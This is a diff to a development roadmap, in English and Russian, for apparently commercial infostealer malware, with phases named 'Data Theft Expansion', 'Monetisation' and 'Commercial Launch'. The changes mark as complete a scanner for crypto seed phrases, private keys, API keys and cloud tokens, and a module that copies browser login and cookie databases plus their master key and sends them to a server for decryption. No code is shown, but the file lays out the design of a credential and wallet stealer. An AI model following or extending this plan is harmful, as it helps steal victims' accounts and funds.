@@ -13,7 +13,7 @@ Phase 7: Integration            ████████████████
 Phase 8: Unit Tests             ████████████████████  192/192 ✅
 Phase 8b: Integration Tests     ░░░░░░░░░░░░░░░░░░░░   0/8
 Phase 9: Engine Hardening       ████████████████████  27/27 ✅
-Phase 10: Data Theft Expansion  ████████████████████  22/22 ✅
+Phase 10: Data Theft Expansion  ████████████████████  33/33 ✅
 Phase 11: Additional Theft      ░░░░░░░░░░░░░░░░░░░░   0/16
 Phase 12: Monetisation          ░░░░░░░░░░░░░░░░░░░░   0/16
 Phase 13: Infrastructure        ░░░░░░░░░░░░░░░░░░░░   0/16
@@ -305,19 +305,20 @@ Phase 15: Commercial Launch     ░░░░░░░░░░░░░░░░
 - [x] `system_info.zig` — Integrate: launch_info, processes, applications, clipboard
 
 ### 10.5 Regex-граббер
-- [ ] `system/regex_grabber.zig` — BIP39 seed phrase scanner (12/18/24 words)
-- [ ] `system/regex_grabber.zig` — Private key scanner (BTC WIF, ETH hex, SOL base58, XMR)
-- [ ] `system/regex_grabber.zig` — API keys / JWT tokens scanner
-- [ ] `system/regex_grabber.zig` — In-memory only scan
+- [x] `system/regex_grabber.zig` — BIP39 seed phrase scanner (12/18/24 words, 2048-word list)
+- [x] `system/regex_grabber.zig` — Private key scanner (BTC WIF, ETH hex, SOL base58, XMR)
+- [x] `system/regex_grabber.zig` — API keys / JWT / AWS keys / GitHub tokens scanner
+- [x] `system/regex_grabber.zig` — In-memory only scan (MappedFile, no temp files)
+- [x] `system_info.zig` — Integrated into report
 
 ### 10.6 Server-Side Processing (SSP)
-- [ ] `browsers/ssp.zig` — Билд: копировать сырые .db, не открывать SQLite
-- [ ] `browsers/ssp.zig` — Извлечь мастер-ключ из Local State
-- [ ] `browsers/ssp.zig` — Отправить ключ + сырые .db на сервер
-- [ ] `Panel/Services/ServerSideDecryptor.cs` — C# SQLite парсинг
-- [ ] `Panel/Services/ServerSideDecryptor.cs` — AES-GCM расшифровка через BCrypt
-- [ ] `Panel/Services/ServerSideDecryptor.cs` — App-Bound расшифровка на сервере
-- [ ] `config.zig` — Флаг ENABLE_SSP
+- [x] `browsers/ssp.zig` — Билд: копировать сырые .db (Login Data, Cookies, Web Data, History)
+- [x] `browsers/ssp.zig` — Извлечь мастер-ключ из Local State + упаковка в ZIP
+- [x] `browsers/ssp.zig` — Отправить ключ + сырые .db на сервер в ZIP архиве
+- [x] `Panel/Services/ServerSideDecryptor.cs` — C# SQLite парсинг (Microsoft.Data.Sqlite)
+- [x] `Panel/Services/ServerSideDecryptor.cs` — AES-GCM расшифровка через System.Security.Cryptography
+- [x] `Panel/Services/ServerSideDecryptor.cs` — Gecko cookies + history парсинг
+- [x] `config.zig` — Флаг ENABLE_SSP (false по умолчанию)
 
 ---
 
@@ -513,7 +514,7 @@ Phase 15: Commercial Launch     ░░░░░░░░░░░░░░░░
 | 8. Unit Tests | 192 | ✅ Pass | **192/192** |
 | 8b. Integration Tests | 8 | 1 day | **0/8** |
 | 9. Engine Hardening | 23 | 7 days | **0/23** |
-| 10. Data Theft Expansion | 22 | ✅ Done | **22/22** |
+| 10. Data Theft Expansion | 33 | ✅ Done | **33/33** |
 | 11. Additional Theft | 16 | 4 days | **0/16** |
 | 12. Monetisation | 16 | 5 days | **0/16** |
 | 13. Infrastructure | 16 | 4 days | **0/16** |
